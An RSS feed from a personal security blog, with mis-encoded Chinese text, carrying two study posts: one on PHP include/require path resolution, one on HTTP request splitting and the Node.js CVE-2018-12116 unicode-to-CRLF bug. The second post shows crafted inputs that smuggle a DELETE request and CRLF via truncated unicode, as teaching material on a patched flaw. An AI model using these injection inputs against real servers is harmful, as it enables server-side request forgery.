<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 13 Dec 2021 01:12:22 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>å…³äºŽinclude/require(_once)çš„æ˜“æ··æ·†ç‚¹</title><link>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</link><pubDate>Mon, 13 Dec 2021 01:12:22 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</guid><description>&lt;p>ä¹‹å‰åšé¢˜é‡åˆ°åŽæŸ¥äº†ä¸€ä¸‹ç›¸å…³æ–‡ç« ï¼Œè§‰å¾—å¾ˆé€‚åˆå‡ºé¢˜ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸èƒ½ä¸ºäº†è€ƒè€Œè€ƒï¼Œä¹Ÿå°±å¤±åŽ»äº†CTFçš„æ„ä¹‰ï¼Œæ‰€ä»¥è¿˜ä¸å¦‚å…ˆå‘å‡ºæ¥è¿™ä¸€ç¯‡&lt;/p>
&lt;p>&lt;del>ï¼ˆåˆ«éª‚äº† å°±æ˜¯æ‡’&lt;/del>&lt;/p>
&lt;h2 id="å…³äºŽincluderequire_once">å…³äºŽ&lt;code>include/require(_once)()&lt;/code>&lt;/h2>
&lt;p>è¿™å‡ ä¸ªå‡½æ•°åº”è¯¥éƒ½ä¸é™Œç”Ÿï¼ˆè¿˜åº”è¯¥å†åŠ ä¸Šinclude_pathï¼‰ï¼Œå¹²çš„æ˜¯æ–‡ä»¶åŒ…å«çš„äº‹ï¼›å…ˆæŒ‰ç…§ç»™å®šå‚æ•°å¯»æ‰¾è·¯å¾„ï¼ˆå½“å®šä¹‰äº†è·¯å¾„åˆ™ä¼šå®Œå…¨å¿½ç•¥include_pathï¼‰ï¼Œå¦‚æžœåªæœ‰æ–‡ä»¶ååˆ™æŒ‰ç…§include_pathçš„æŒ‡å®šç›®å½•å¯»æ‰¾ï¼Œå¦‚æžœè¿˜æ²¡æ‰¾åˆ°åˆ™ä¼šåœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ï¼›ä¸‹é¢è¯´å‡ ä¸ªå°ç‚¹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯requireå’Œincludeçš„åŒºåˆ«åœ¨äºŽrequireåœ¨å‡ºé”™æ—¶ä¼šäº§ç”ŸE_COMPILE_ERRORçº§åˆ«çš„é”™è¯¯ï¼Œè„šæœ¬å°†ä¸­æ­¢è¿è¡Œï¼Œè€Œincludeåªä¼šäº§ç”Ÿè­¦å‘ŠE_WARNINGï¼Œä¸å½±å“ç»§ç»­é¡¶ç€é”™è¯¯ç»§ç»­æ‰§è¡Œè„šæœ¬ï¼ˆåšé¢˜å¾ˆå¸¸è§è¿™ä¸ª æ— æ•°çš„æŠ¥é”™ä¸‹é¢æœ‰æ­£å¸¸çš„å›žæ˜¾ï¼‰&lt;/p>
&lt;p>å¦ä¸€ä¸ªåŒºåˆ«åœ¨äºŽrequireæ˜¯æ— æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œå³ç¨‹åºæ‰§è¡Œå‰å°±ä¼šå°†æ–‡ä»¶å†…å®¹ä»¥æ–‡æœ¬æ›¿æ¢çš„å½¢å¼å¼•å…¥ï¼ˆæ‰€ä»¥è¿™ä»½æ–‡ä»¶åªè¢«å¤„ç†ä¸€æ¬¡ï¼‰ï¼Œè®©å®ƒå˜ä¸ºphpè„šæœ¬çš„ä¸€éƒ¨åˆ†ï¼ˆæ‰€ä»¥é€šå¸¸æ”¾åœ¨phpæ–‡ä»¶çš„æœ€å‰é¢ï¼‰ï¼›includeåˆ™æ˜¯æœ‰æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œç”¨åˆ°æ—¶æ‰è¢«åŠ è½½ï¼Œä¸”æ¯æ¬¡æ‰§è¡Œæ–‡ä»¶æ—¶éƒ½è¦è¿›è¡Œè¯»å–å’Œè¯„ä¼°&lt;/p>
&lt;p>å½“phpé‡åˆ°require/include(_once)å‡½æ•°æ—¶ï¼Œå¦‚æžœç»™å®šçš„å‚æ•°æ˜¯ä¸ªç»å¯¹è·¯å¾„åˆ™ç›´æŽ¥å¼•å…¥ï¼Œä½†å¦‚æžœç»™çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™è¦è¿›å…¥å¦å¤–çš„é€»è¾‘ï¼ˆç»è¿‡å¤šæ¬¡è°ƒç”¨ï¼Œå®å±•å¼€åŽè¿›å…¥_php_stream_fopen_with_pathï¼‰å¯»æ‰¾æ­¤æ–‡ä»¶ï¼›åœ¨_php_stream_fopen_with_pathä¼šæ ¹æ®include_pathå’Œå½“å‰æ‰§è¡Œæ–‡ä»¶çš„pathç»„æˆä¸€ä¸ªå¾…é€‰çš„ç›®å½•åˆ—è¡¨ï¼Œç„¶åŽä»Žåˆ—è¡¨å¤´éƒ¨å¼€å§‹æ ¹æ®DEFAULT_DIR_SEPARATORï¼ˆlinuxä¸‹é»˜è®¤ä¸º&lt;code>:&lt;/code> winä¸º&lt;code>;&lt;/code>ï¼‰å–å‡ºè·¯å¾„ï¼Œç„¶åŽæ‹¼ä¸Šæ–‡ä»¶åï¼Œå¦‚æžœæˆåŠŸåˆ™è¿”å›žï¼Œå¤±è´¥åˆ™ç»§ç»­ä¸‹ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„ï¼ˆ&lt;u>æ‰€ä»¥å¦‚æžœæœ‰é‡åçš„å°±å¥½çŽ©äº†&lt;/u>ï¼‰&lt;/p>
&lt;h2 id="å‡ ä¸ªå¥½çŽ©çš„å°æ —å­">å‡ ä¸ªå¥½çŽ©çš„å°æ —å­&lt;/h2>
&lt;p>è¿™é‡Œä¸¾ä¸€ä¸ªå°æ —å­ï¼Œæ–‡ä»¶ç»“æž„å’Œå†…å®¹å¦‚ä¸‹ï¼ˆæ³¨æ„è¿™é‡Œinclude_pathçš„å†™æ³•!!!ä¸ä»…æœ‰path_to_subdirè¿˜æœ‰&lt;code>:&lt;/code>åˆ†éš”ç¬¦å‰é¢ä»£è¡¨çš„current_dir!!!ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095717109.png" alt="image-20211024095717109">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095830345.png" alt="image-20211024095830345">&lt;/p>
&lt;p>åœ¨ä¸åŒçš„æƒ…å†µä¸‹è¿è¡Œçœ‹çœ‹æ•ˆæžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024100007587.png" alt="image-20211024100007587">&lt;/p>
&lt;p>åœ¨rootç›®å½•ä¸‹æ‰§è¡Œæ—¶ï¼Œç›´æŽ¥æ ¹æ®1.phpçš„include_pathå¯»æ‰¾2.phpï¼Œè€Œ2.phpä¸­å¹¶æ²¡æœ‰è®¾ç½®include_pathï¼Œé‚£ä¹ˆè·¯å¾„å°±å˜æˆäº†åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„ å³&lt;code>&amp;quot;.&amp;quot;&lt;/code>ï¼Œè€Œå½“å‰å·¥ä½œç›®å½•æ˜¯rootï¼Œæ‰€ä»¥å°±æ˜¯/root/3.phpçš„è¾“å‡º&lt;/p>
&lt;p>æ¢åˆ°subdirç›®å½•ä¸‹æ‰§è¡Œ1.phpæ—¶ï¼Œåˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„&lt;code>&amp;quot;.&amp;quot;&lt;/code>å˜ä¸ºäº†subdirï¼Œè‡ªç„¶è¾“å‡ºå˜ä¸ºäº†/root/subdir/3.phpçš„è¾“å‡º&lt;/p>
&lt;p>çŽ°åœ¨æˆ‘ä»¬æŠŠinclude_pathä»…ä¿ç•™path_to_subdirï¼Œç»§ç»­ä¸Šé¢çš„æŒ‡ä»¤è¿è¡Œä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024190934131.png" alt="image-20211024190934131">&lt;/p>
&lt;p>é‚£ä¸ç®¡å½“å‰è·¯å¾„æ˜¯ä»€ä¹ˆéƒ½ä¼šå¾—åˆ°subdirçš„è¾“å‡º&lt;/p>
&lt;p>å†è¿›ä¸€æ­¥ï¼Œåœ¨2.phpä¸­åŠé“æ¸…ç©ºinclude_pathä¼šæ€Žä¹ˆæ ·å‘¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024191919122.png" alt="image-20211024191919122">&lt;/p>
&lt;p>æˆ‘ä»¬å‘çŽ°è·Ÿä¸Šé¢ç»“æžœä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œçš„é€»è¾‘å´æœ‰å·®å¼‚ï¼š2.phpä¸­æ¸…ç©ºinclude_pathåŽå†åŒ…å«æ–‡ä»¶å°†ä¼šè‡ªåŠ¨å˜ä¸ºcurrent_pathçš„è·¯å¾„ï¼Œè€Œ2.phpåœ¨/root/subdirä¸‹ï¼Œæ‰€ä»¥å›žæ˜¾å’Œ2.phpçš„è·¯å¾„ä¿æŒä¸€è‡´&lt;/p>
&lt;p>å†å†è¿›ä¸€æ­¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024192931075.png" alt="image-20211024192931075">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024193020147.png" alt="image-20211024193020147">&lt;/p>
&lt;p>è¯¶ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºŽè¿™é‡Œä¸¤æ¬¡éƒ½ç”¨åˆ°äº†ç›¸å¯¹ç›®å½•çš„&lt;code>&amp;quot;./&amp;quot;&lt;/code>è¿›è¡Œå¼•ç”¨ï¼Œæ‰€ä»¥åœ¨/rootç›®å½•ä¸‹è¿è¡Œå¾ˆé¡ºç•…ï¼Œè€Œ/root/subdirç›®å½•ä¸‹ç”±äºŽä¸ä¼šå†å­˜åœ¨./subdir/2.phpï¼Œæ‰€ä»¥æŠ¥é”™é€€å‡º&lt;/p>
&lt;h2 id="ä½¿ç”¨æ³¨æ„">ä½¿ç”¨æ³¨æ„&lt;/h2>
&lt;ul>
&lt;li>åœ¨ä½¿ç”¨include_pathå’Œç›¸å¯¹è·¯å¾„æ—¶ä¼šå½±å“æ€§èƒ½ï¼Œæ‰€ä»¥æœ€å¥½ç”¨ç»å¯¹è·¯å¾„&lt;/li>
&lt;li>ç›®å½•ç›¸å¯¹è·¯å¾„çš„basediræ°¸è¿œæ˜¯å½“å‰å·¥ä½œè·¯å¾„&lt;/li>
&lt;li>å¯ä»¥é€šè¿‡&lt;code>__DIR__&lt;/code>æ¥èŽ·å¾—ç»å¯¹è·¯å¾„&lt;/li>
&lt;li>å»ºè®®å°‘ä½¿ç”¨&lt;code>include/require_once&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>*å†™çš„ä¸å…¨é¢ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†éœ€è¦è¡¥å…… å…ˆé¸½äº†ï¼Œé‡åˆ°é¢˜æˆ–è€…å…·ä½“çš„åº”ç”¨åœºæ™¯æˆ‘è¡¥å……ä¸Šæ¥&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ðŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.laruence.com/2010/05/04/1450.html">æ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>HTTPè¯·æ±‚åˆ‡åˆ†æ”»å‡»å­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</link><pubDate>Tue, 07 Dec 2021 02:24:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</guid><description>&lt;p>è¯´åˆ°ä¸ŽHTTPè¯·æ±‚æœ‰å…³çš„æ”»å‡»æ–¹å¼èƒ½æƒ³åˆ°ä»€ä¹ˆï¼Ÿ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205111212810.png" alt="image-20211205111212810">&lt;/p>
&lt;p>&lt;del>æ˜¯ä¸æ˜¯ä¸€ä¸‹å­æç„¶å¤§æ˜Žç™½äº†&lt;/del>&lt;/p>
&lt;p>è¿™ä¸€ç¯‡å°±æ˜¯å…¶ä¸­HTTP Request Splittingçš„å­¦ä¹ ç¬”è®°ï¼Œé•¿æœŸæ›´æ–°ï¼›å…¶å®ƒæ¨¡å—çš„ä¹Ÿä¼šéšåŽæ›´æ–°~&lt;/p>
&lt;p>è€è§„çŸ©ï¼Œæ‰€æœ‰çš„å‚è€ƒé“¾æŽ¥&amp;amp;dockeré“¾æŽ¥æ”¾åˆ°æ–‡æœ«&lt;/p>
&lt;h2 id="nodejs-httpè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå">Node.js: httpè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå&lt;/h2>
&lt;blockquote>
&lt;p>ä½¿ç”¨Node.jså‘ç‰¹å®šè·¯å¾„å‘å‡ºhttpè¯·æ±‚ï¼Œä½†æ˜¯å´è¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„&lt;/p>
&lt;/blockquote>
&lt;p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸æ˜¯ä¸ªå­—ç¬¦ä¸²stringï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä»¥åŽŸå§‹å­—èŠ‚raw bytesè¾“å‡ºï¼Œjsæ”¯æŒunicodeï¼Œè¿™å…¶ä¸­æ¶‰åŠåˆ°äº†unicodeç¼–ç è½¬æ¢ã€‚å¯¹äºŽä¸åŒ…å«bodyçš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨&lt;code>latin1&lt;/code>ï¼Œå®ƒæ˜¯å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œæ¯”å¦‚emoji ðŸ¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">v&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/caf\u{E9}\u{01F436}&amp;#39;&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103409976.png" alt="image-20211205103409976">&lt;/p>
&lt;p>ä¸¤å­—èŠ‚çš„unicodeç¼–ç ç”¨&lt;code>latin1&lt;/code>è½¬æ¢ä¸ºå•å­—èŠ‚æ—¶ä¼šè¢«æˆªåŽ»å¼€å¤´çš„ç¬¬ä¸€ä¸ªå­—èŠ‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{5b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{015b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{0128}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{28}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103625305.png" alt="image-20211205103625305">&lt;/p>
&lt;hr>
&lt;p>é‚£è¿™ä¸ªNode.jsçš„å®‰å…¨é—®é¢˜è·ŸSSRFåˆæ˜¯æ€Žä¹ˆè”ç³»åˆ°ä¸€èµ·çš„å‘¢ï¼Ÿå¤„ç†ç”¨æˆ·è¾“å…¥æ—¶å‡ºçŽ°äº†æ•°æ®æŸåæ˜¯ä¸ªæ˜Žæ˜¾çš„å±é™©ä¿¡å·&lt;/p>
&lt;h2 id="http-request-splitting">HTTP Request Splitting&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>é€šä¿—æ¥è¯´ï¼Œå°±æ˜¯åŽŸæœ¬1ä¸ªè¯·æ±‚å¯¹åº”1æ¬¡å“åº”ï¼ŒçŽ°åœ¨æˆ‘ä»¬å¯¹è¯·æ±‚çš„bodyéƒ¨åˆ†å†æ·»åŠ 1ä¸ªè¯·æ±‚ï¼Œå¯¼è‡´çœ‹ä¼¼å‘é€äº†1æ¬¡è¯·æ±‚å®žåˆ™ä¼šè¢«è§£é‡Šä¸º2ä¸ªå“åº”è¢«åŠ è½½å‡ºæ¥ï¼Œä¼šé€ æˆXSSå’ŒSSRF&lt;/p>
&lt;p>ä¸¾ä¸€ä¸ªç®€å•çš„å°æ —å­ï¼šä¸€èˆ¬çš„è¯·æ±‚å½¢å¼æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=&amp;lt;user-input-here&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯æˆ‘ä»¬æž„é€ äº†è¿™æ ·çš„ç”¨æˆ·è¾“å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n
&lt;/code>&lt;/pre>&lt;p>å½“è¯·æ±‚å‘å‡ºåŽï¼ŒæœåŠ¡ç«¯å°†ä¼šæ”¶åˆ°è¿™æ ·çš„è¯·æ±‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=x&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
DELETE /private-api HTTP/1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒ…å«äº†ä¸¤ä¸ªè¯·æ±‚æ–¹å¼ï¼Œå¦‚æžœæœåŠ¡ç«¯æ²¡æœ‰è®¾ç½®ç‰¹æ®Šçš„è¿‡æ»¤åˆ™å¯èƒ½ä¼šå°†ä¸¤ä¸ªè¯·æ±‚å…¨éƒ¨æ‰§è¡Œå¹¶å›žæ˜¾ï¼›è€Œå¦‚æžœç¬¬äºŒä¸ªé¢å¤–çš„è¯·æ±‚åŒ…å«ä¸€äº›åªæœ‰æœåŠ¡ç«¯æœ¬åœ°æ‰èƒ½è®¿é—®åˆ°çš„å†…å®¹ï¼Œåˆ™ä¼šé€ æˆSSRF(Server-Side Request Forgery)&lt;/p>
&lt;h2 id="ssrf-via-request-splitting--cve-2018-12116">SSRF via Request Splitting / cve-2018-12116&lt;/h2>
&lt;p>æ­£å¦‚ä¸Šé¢æ —å­å±•ç¤ºçš„é‚£æ ·ï¼Œä¸è¿‡ä¸€èˆ¬httpåº“éƒ½ä¼šå¯¹è¿™ç§è¡Œä¸ºåšå‡ºé˜²èŒƒï¼›Node.jsä¹Ÿä¸ä¾‹å¤–ï¼Œæ¯”å¦‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\r\n/test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160107403.png" alt="image-20211205160107403">&lt;/p>
&lt;p>æ¢æˆunicodeå‘¢ï¼Ÿç”»é£Žå¼€å§‹å¥‡æ€ªäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>'http://example.com/\u{010D}\u{010A}/test'
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160205490.png" alt="image-20211205160205490">&lt;/p>
&lt;p>ä¸Šé¢æˆ‘ä»¬æè¿‡çš„unicodeæˆªåŽ»å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥æž„é€ &lt;code>\r\n&lt;/code>äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://example.com/\u{010D}\u{010A}/test&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205164009244.png" alt="image-20211205164009244">&lt;/p>
&lt;p>å½“Node.js&amp;lt;=8æž„é€ å¯¹è¿™æ ·çš„urlè¯·æ±‚æ—¶ï¼Œç”±äºŽä»–ä»¬ä¸æ˜¯HTTPæŽ§åˆ¶å­—ç¬¦æ‰€ä»¥ä¸ä¼šä¿®æ”¹ï¼ŒåŽŸæ ·è¾“å‡ºï¼›è€Œç»“åˆä¸Šé¢æˆ‘ä»¬æè¿‡çš„unicodeæˆªåŽ»å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥æž„é€ &lt;code>\r\n&lt;/code>çš„CRLFiäº†&lt;/p>
&lt;p>çŽ°åœ¨çš„Node.jså‡å·²ä¿®å¤æ­¤é—®é¢˜ï¼Œå®˜æ–¹ä¿®å¤-&amp;gt;&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163601837.png" alt="image-20211205163601837">&lt;/p>
&lt;p>æ—§ç‰ˆä¸­ä¼šç›´æŽ¥å¯¹è§£é‡Šä¸äº†çš„unicodeæŠ¥é”™ï¼Œè€Œä¸æ˜¯å°è¯•åŽŸå°ä¸åŠ¨çš„æ¬è¿‡åŽ»è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163703908.png" alt="image-20211205163703908">&lt;/p>
&lt;h3 id="çœŸå®žåœºæ™¯ä¸‹çš„æ¡ˆä¾‹">çœŸå®žåœºæ™¯ä¸‹çš„æ¡ˆä¾‹&lt;/h3>
&lt;p>æ¥è‡ª-&amp;gt;&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a> å¼ºçƒˆå»ºè®®çœ‹åŽŸæ–‡&lt;/p>
